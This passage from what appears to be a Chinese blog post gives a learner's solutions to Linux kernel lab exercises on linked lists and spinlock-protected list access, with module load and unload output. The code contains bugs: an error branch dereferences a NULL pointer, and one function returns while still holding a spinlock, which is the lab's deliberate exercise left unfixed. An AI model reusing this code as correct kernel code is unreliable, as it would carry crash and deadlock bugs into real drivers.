exiting&quot;</span>);</span><br><span class="line">	task_info_purge_list();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(list_init);</span><br><span class="line">module_exit(list_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">4</span>-<span class="built_in">list</span><span class="meta"># insmod list.ko                          </span></span><br><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">4</span>-<span class="built_in">list</span><span class="meta"># rmmod list.ko                           </span></span><br><span class="line"><span class="number">216</span>:<span class="number">-48258</span>                                                                      </span><br><span class="line">before exiting: [                                                               </span><br><span class="line">(<span class="number">1</span>, <span class="number">4294930828</span>)                                                                 </span><br><span class="line">(<span class="number">0</span>, <span class="number">4294930828</span>)                                                                 </span><br><span class="line">(<span class="number">213</span>, <span class="number">4294930828</span>)                                                               </span><br><span class="line">(<span class="number">239</span>, <span class="number">4294930828</span>)                                                               </span><br><span class="line">]  </span><br></pre></td></tr></table></figure>
<p>5.Working with kernel lists for process handling：</p>
<ul>
<li>熟悉 Linux 链表的使用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kernel API lab</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * list-full.c: Working with lists (advanced)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/list.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Full list processing&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> &#123;</span></span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> timestamp;</span><br><span class="line">	<span class="keyword">atomic_t</span> count;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">head</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct task_info *<span class="title">task_info_alloc</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	ti = kmalloc(<span class="keyword">sizeof</span>(*ti), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (ti == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	ti-&gt;pid = pid;</span><br><span class="line">	ti-&gt;timestamp = jiffies;</span><br><span class="line">	atomic_set(&amp;ti-&gt;count, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct task_info *<span class="title">task_info_find_pid</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: Look for pid and return task_info or NULL if not found */</span></span><br><span class="line">	list_for_each(p, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		<span class="keyword">if</span>(ti-&gt;pid == pid)&#123;</span><br><span class="line">			<span class="keyword">return</span> ti;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_add_to_list</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	ti = task_info_find_pid(pid);</span><br><span class="line">	<span class="keyword">if</span> (ti != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		ti-&gt;timestamp = jiffies;</span><br><span class="line">		atomic_inc(&amp;ti-&gt;count);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	ti = task_info_alloc(pid);</span><br><span class="line">	list_add(&amp;ti-&gt;<span class="built_in">list</span>, &amp;head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_add_for_current</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	task_info_add_to_list(current-&gt;pid);</span><br><span class="line">	task_info_add_to_list(current-&gt;parent-&gt;pid);</span><br><span class="line">	task_info_add_to_list(next_task(current)-&gt;pid);</span><br><span class="line">	task_info_add_to_list(next_task(next_task(current))-&gt;pid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_print_list</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	pr_info(<span class="string">&quot;%s: [ &quot;</span>, msg);</span><br><span class="line">	list_for_each(p, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		pr_info(<span class="string">&quot;(%d, %lu) &quot;</span>, ti-&gt;pid, ti-&gt;timestamp);</span><br><span class="line">	&#125;</span><br><span class="line">	pr_info(<span class="string">&quot;]\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_remove_expired</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>, *<span class="title">q</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	list_for_each_safe(p, q, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		<span class="keyword">if</span> (jiffies - ti-&gt;timestamp &gt; <span class="number">3</span> * HZ &amp;&amp; atomic_read(&amp;ti-&gt;count) &lt; <span class="number">5</span>) &#123;</span><br><span class="line">			list_del(p);</span><br><span class="line">			kfree(ti);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_purge_list</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>, *<span class="title">q</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	list_for_each_safe(p, q, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		list_del(p);</span><br><span class="line">		kfree(ti);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">list_full_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	INIT_LIST_HEAD(&amp;head);</span><br><span class="line"></span><br><span class="line">	task_info_add_for_current();</span><br><span class="line">	task_info_print_list(<span class="string">&quot;after first add&quot;</span>);</span><br><span class="line"></span><br><span class="line">	set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">	schedule_timeout(<span class="number">5</span> * HZ);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">list_full_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 2: Ensure that at least one task is not deleted */</span></span><br><span class="line">	ti = task_info_find_pid(current-&gt;parent-&gt;pid);</span><br><span class="line">	<span class="keyword">if</span>(ti == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		printk(<span class="string">&quot;not find pid: %d&quot;</span>,ti-&gt;pid);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		printk(<span class="string">&quot;find pid: %d&quot;</span>,ti-&gt;pid);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	list_del(&amp;ti-&gt;<span class="built_in">list</span>);</span><br><span class="line">	task_info_remove_expired();</span><br><span class="line">	list_add(&amp;ti-&gt;<span class="built_in">list</span>, &amp;head);</span><br><span class="line">	task_info_print_list(<span class="string">&quot;after removing expired&quot;</span>);</span><br><span class="line">	task_info_purge_list();</span><br><span class="line">	task_info_remove_expired();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(list_full_init);</span><br><span class="line">module_exit(list_full_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">5</span>-<span class="built_in">list</span>-full<span class="meta"># insmod list-full.ko                </span></span><br><span class="line">list_full: loading out-of-tree <span class="keyword">module</span> taints kernel.                            </span><br><span class="line">after first add: [                                                              </span><br><span class="line">(<span class="number">1</span>, <span class="number">4294916763</span>)                                                                 </span><br><span class="line">(<span class="number">0</span>, <span class="number">4294916763</span>)                                                                 </span><br><span class="line">(<span class="number">213</span>, <span class="number">4294916763</span>)                                                               </span><br><span class="line">(<span class="number">238</span>, <span class="number">4294916763</span>)                                                               </span><br><span class="line">]                                                                               </span><br><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">5</span>-<span class="built_in">list</span>-full<span class="meta"># rmmod list-full.ko                 </span></span><br><span class="line">find pid: <span class="number">213</span>                                                                   </span><br><span class="line">after removing expired: [                                                       </span><br><span class="line">(<span class="number">213</span>, <span class="number">4294916763</span>)                                                               </span><br><span class="line">]  </span><br></pre></td></tr></table></figure>
<p>6.Synchronizing list work：</p>
<ul>
<li>熟悉 Linux 锁的使用</li>
<li>熟悉 Linux 符号的导出</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Linux API lab</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * list-sync.c - Synchronize access to a list</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/list.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Full list processing with synchronization&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> &#123;</span></span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> timestamp;</span><br><span class="line">	<span class="keyword">atomic_t</span> count;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">head</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* TODO 1: you can use either a spinlock or rwlock, define it here */</span></span><br><span class="line">DEFINE_SPINLOCK(lock);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct task_info *<span class="title">task_info_alloc</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	ti = kmalloc(<span class="keyword">sizeof</span>(*ti), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (ti == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	ti-&gt;pid = pid;</span><br><span class="line">	ti-&gt;timestamp = jiffies;</span><br><span class="line">	atomic_set(&amp;ti-&gt;count, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct task_info *<span class="title">task_info_find_pid</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	list_for_each(p, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		<span class="keyword">if</span> (ti-&gt;pid == pid) &#123;</span><br><span class="line">			<span class="keyword">return</span> ti;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_add_to_list</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: Protect list, is this read or write access? */</span></span><br><span class="line">	spin_lock(&amp;lock);</span><br><span class="line">	ti = task_info_find_pid(pid);</span><br><span class="line">	<span class="keyword">if</span> (ti != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		ti-&gt;timestamp = jiffies;</span><br><span class="line">		atomic_inc(&amp;ti-&gt;count);</span><br><span class="line">		<span class="comment">/* <span class="doctag">TODO:</span> Guess why this comment was added  here */</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;lock);</span><br><span class="line">	<span class="comment">/* TODO 1: critical section ends here */</span></span><br><span class="line"></span><br><span class="line">	ti = task_info_alloc(pid);</span><br><span class="line">	<span class="comment">/* TODO 1: protect list access, is this read or write access? */</span></span><br><span class="line">	spin_lock(&amp;lock);</span><br><span class="line">	list_add(&amp;ti-&gt;<span class="built_in">list</span>, &amp;head);</span><br><span class="line">	spin_unlock(&amp;lock);</span><br><span class="line">	<span class="comment">/* TODO 1: critical section ends here */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">task_info_add_for_current</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	task_info_add_to_list(current-&gt;pid);</span><br><span class="line">	task_info_add_to_list(current-&gt;parent-&gt;pid);</span><br><span class="line">	task_info_add_to_list(next_task(current)-&gt;pid);</span><br><span class="line">	task_info_add_to_list(next_task(next_task(current))-&gt;pid);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(task_info_add_for_current);</span><br><span class="line"><span class="comment">/* TODO 2: Export the kernel symbol */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">task_info_print_list</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	pr_info(<span class="string">&quot;%s: [ &quot;</span>, msg);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: Protect list, is this read or write access? */</span></span><br><span class="line">	spin_lock(&amp;lock);</span><br><span class="line">	list_for_each(p, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		pr_info(<span class="string">&quot;(%d, %lu) &quot;</span>, ti-&gt;pid, ti-&gt;timestamp);</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;lock);</span><br><span class="line">	<span class="comment">/* TODO 1: Critical section ends here */</span></span><br><span class="line">	pr_info(<span class="string">&quot;]\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(task_info_print_list);</span><br><span class="line"><span class="comment">/* TODO 2: Export the kernel symbol */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">task_info_remove_expired</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>, *<span class="title">q</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: Protect list, is this read or write access? */</span></span><br><span class="line">	spin_lock(&amp;lock);</span><br><span class="line">	list_for_each_safe(p, q, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		<span class="keyword">if</span> (jiffies - ti-&gt;timestamp &gt; <span class="number">3</span> * HZ &amp;&amp; atomic_read(&amp;ti-&gt;count) &lt; <span class="number">5</span>) &#123;</span><br><span class="line">			list_del(p);</span><br><span class="line">			kfree(ti);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;lock);</span><br><span class="line">	<span class="comment">/* TODO 1: Critical section ends here */</span></span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(task_info_remove_expired);</span><br><span class="line"><span class="comment">/* TODO 2: Export the kernel symbol */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_purge_list</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>, *<span class="title">q</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: Protect list, is this read or write access? */</span></span><br><span class="line">	spin_lock(&amp;lock);</span><br><span class="line">	list_for_each_safe(p, q, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span 